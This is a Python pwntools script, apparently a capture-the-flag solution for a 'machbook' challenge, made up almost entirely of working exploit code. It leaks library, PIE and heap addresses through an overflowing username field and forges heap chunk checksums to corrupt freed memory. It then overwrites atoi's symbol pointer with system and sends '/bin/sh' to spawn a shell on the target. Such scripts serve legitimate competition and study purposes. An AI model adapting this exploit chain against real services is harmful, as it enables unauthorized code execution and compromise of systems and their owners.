from pwn import *
import sys

def register(username,password) : 
	p.sendlineafter("Choice:","2")
	p.sendafter(":",username)
	p.sendafter(":",password)

def login(username,password) : 
	p.sendlineafter("Choice:","1")
	p.sendafter(":",username)
	p.sendafter(":",password)

def post(content) : 
	p.sendlineafter("Choice:","1")
	p.sendafter(":",content)

def delete(idx) : 
	p.sendlineafter("Choice:","3")
	p.sendlineafter(":",str(idx))

def changeu(username) : 
	p.sendlineafter("Choice:","4")
	p.sendafter(":",username)

def changep(password) : 
	p.sendlineafter("Choice:","5")
	p.sendafter(":",password)

def show(idx) : 
	p.sendlineafter("Choice:","2")
	p.sendlineafter(":",str(idx))


def calc_checksum(addr,random) : 
	ptr = addr ^ random
	chk  = 0xff&(ptr >>  0)
	chk += 0xff&(ptr >>  8)
	chk += 0xff&(ptr >> 16)
	chk += 0xff&(ptr >> 24)
	chk += 0xff&(ptr >> 32)
	chk += 0xff&(ptr >> 40)
	chk += 0xff&(ptr >> 48)
	chk += 0xff&(ptr >> 56)
	return chk


def leak(addr,ran = 6) :
	result = "" 
	for i in range(ran) : 
		changeu("\\"*6+"A"*28+p64(addr+i)[:-2])

		show(0)
		p.recvuntil(": ")
		tmp = p.recv(1)

		if tmp == '\x0a' : 
			result += "\x00"
			continue
		result += tmp
	return u64(result.ljust(8,"\x00"))

while True: # It requires bruteforce until specific adress
	try:
		for i in range(100) : 
			if sys.argv[1] == "1" : 
				p = remote("machbook.balsnctf.com",19091)
				sleep(1)
			else : 
				p = process("./machbook")
				sleep(0.3)

			register("a"*0x28,"B")
			login("a"*0x28,"B")
			post("ABBBBCCCCDDDDEEEE")
			post("A"*0x190)


			post("A"*0x190)
			
			changeu("\\"*2+"A"*0x24+"\x00\x04")
			show(0)
			k = p.recvuntil("\x7f",timeout=0.3)
			if k != '' : 
				break
			p.close()

		base = 0x0000000000034D0C

		if sys.argv[1] == "1" : 
			pieleakbase = 0x366015d8 + 0x2ef48 + 0x18af0
		else : 
			pieleakbase = 0x368865d8 + 0x2ef48 + 0x18af0

		libdispatch = u64(k[-6:]+"\x00\x00") - base

		print 'libcdispatch : ' + hex(libdispatch)

		changeu("\\"*6+"A"*28+p64(libdispatch+pieleakbase)[:-2])


		show(0)
		p.recvuntil(": ")

		pie = leak(libdispatch+pieleakbase)

		print 'pie : ' + hex(pie)

		heap = leak(pie+0x20b0)
		print 'heap : ' + hex(heap)

		system = leak(pie+0x2048) - 0x0000000000023b4e + 0x000000000007aa0a


		print 'system : ' + hex(system)
		
		changeu("aa")

		for i in range(4) : 
			post("1")

		p.sendlineafter("Choice:","6")

		register("AA","BB")
		login("AA","BB")

		p.sendlineafter("Choice:","6")
		login("aa","B")

		ptr = pie + 0x7380
		randomvalue = leak(ptr+632,ran=8)

		print "checksum's ptr : " + hex(ptr)
		print "checksum's randomvalue : " + hex(randomvalue)
		print "result : " + hex(calc_checksum(ptr,randomvalue))

		two = leak(pie+0x20e8)
		three = leak(pie+0x2118) 

		print hex(three)
		print hex(two)

		changeu("\\"*6+"A"*28+p64(three)[:-2])
		delete(0)

		changeu("\\"*6+"A"*28+p64(heap)[:-2])
		delete(0)

		changeu("\\"*6+"A"*28+p64(two)[:-2])
		delete(0)

		target = pie+0x20b0
		target2 = pie+0x2120-8

		changeu(p64(calc_checksum(heap,ptr^randomvalue)&0xff)+p64(0)+p64(calc_checksum(ptr,randomvalue)&0xff))
		
		changep(p64(target2)+p64(calc_checksum(target2,ptr^randomvalue)&0xff)+p64(target)+p64(calc_checksum(target,ptr^randomvalue)&0xff))

		p.sendlineafter("Choice:","6")

		login("AA","\n")

		changeu(p64(calc_checksum(three,ptr^randomvalue)&0xff)+p64(heap)+p64(calc_checksum(heap,ptr^randomvalue)&0xff))
		changep(p64(0)+p64(calc_checksum(ptr,randomvalue)&0xff)+p64(target2)+p64(calc_checksum(target2,ptr^randomvalue)&0xff))

		for i in range(7) : 
			post("/bin/sh")

		p.sendlineafter("Choice:","6")

		login(p64(calc_checksum(target2,ptr^randomvalue)&0xff),p64(three))

		print "[*] 1 STRAGE !!"
		z = p.recvuntil("Successfully",timeout=0.3)

		if z == '' :  #fail
			p.close()
			continue

		changep(p64(pie+0x2030-1)+"A"*8)
		break
	except:
		p.close()


p.sendlineafter("Choice:","6")
login("A"*8,"\n")

print '[*] 2 STARGE !!'


changep("\x00"+p64(system)*4+p64(system)[:6]) #overwrite atoi@__la_symbol_ptr

p.sendlineafter(":","/bin/sh")

p.interactive()
